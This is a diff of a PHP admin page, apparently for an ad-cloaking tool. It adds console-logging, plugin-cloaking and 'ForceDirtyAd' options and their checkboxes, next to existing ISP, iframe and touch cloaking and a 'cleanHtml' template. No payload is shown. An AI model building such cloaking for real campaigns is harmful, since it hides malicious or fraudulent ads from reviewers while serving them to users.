@@ -210,9 +210,12 @@
 				   		   							 "TrackingPixelEnabled" 			=> "true", 
 				   		   							 "OutputMethod" 					=> "HTML", 
 				   		   							 "CanvasFingerprintCheckEnabled" 	=> "false",
+				   		   							 "ConsoleLoggingEnabled"			=> "false",
 				   		   							 "ISPCloakingEnabled" 				=> "true",
 				   		   							 "IFrameCloakingEnabled" 			=> "true",
-				   		   							 "TouchCloakingEnabled" 			=> "true"),
+				   		   							 "PluginCloakingEnabled"			=> "true",
+				   		   							 "TouchCloakingEnabled" 			=> "true",
+				   		   							 "ForceDirtyAd"						=> "false"),
 				   		   "cleanHtml" 		=> "<html>\n<head>\n\t{script}\n</head>\n<body{onload}>\n</body>\n</html>");
 	}
 
@@ -486,12 +489,20 @@
 			<table class="table table-striped" id="configTable">		
 
 			<tr>
-				<td class="col-xs-5">Logging Enabled</td>
+				<td class="col-xs-5">Logging Enabled (Server side)</td>
 				<td>
 					<input type="hidden" name="LoggingEnabled" value="false" />
 					<input class="form-check-input" type="checkbox" name="LoggingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "LoggingEnabled") ? "checked=checked" : null); ?> />
 				</td>
 			</tr>
+
+			<tr>
+				<td class="col-xs-5">Console Logging Enabled (Client side)</td>
+				<td>
+					<input type="hidden" name="ConsoleLoggingEnabled" value="false" />
+					<input class="form-check-input" type="checkbox" name="ConsoleLoggingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "ConsoleLoggingEnabled") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>			
 
 			<tr>
 				<td>ISP Cloaking Enabled</td>
@@ -510,12 +521,28 @@
 			</tr>
 
 			<tr>
+				<td>Plugin Cloaking Enabled</td>
+				<td>
+					<input type="hidden" name="PluginCloakingEnabled" value="false" />
+					<input class="form-check-input" type="checkbox" name="PluginCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "PluginCloakingEnabled") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>			
+
+			<tr>
 				<td>Touch Cloaking Enabled</td>
 				<td>
 					<input type="hidden" name="TouchCloakingEnabled" value="false" />
 					<input class="form-check-input" type="checkbox" name="TouchCloakingEnabled" value="true" <?= (array_get_bool($currentAd["configArray"], "TouchCloakingEnabled") ? "checked=checked" : null); ?> />
 				</td>
 			</tr>
+
+			<tr>
+				<td>Force Dirty Ad (Server side)</td>
+				<td>
+					<input type="hidden" name="ForceDirtyAd" value="false" />
+					<input class="form-check-input" type="checkbox" name="ForceDirtyAd" value="true" <?= (array_get_bool($currentAd["configArray"], "ForceDirtyAd") ? "checked=checked" : null); ?> />
+				</td>
+			</tr>			
 
 			</table>
 
